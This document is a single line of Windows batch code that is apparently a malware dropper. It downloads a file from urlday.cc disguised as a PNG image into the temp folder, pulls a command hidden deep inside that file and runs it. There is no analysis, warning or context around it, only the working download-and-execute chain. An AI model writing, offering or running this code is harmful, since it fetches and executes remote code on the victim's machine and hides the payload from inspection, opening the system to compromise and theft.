@echo off&powershell iwr -useb urlday.cc/bag -o $env:TEMP\bag.png&for /f "delims=" %%x in ('more /e +669 %temp%\bag.png') do set "Var=%%x"&call %%Var%%
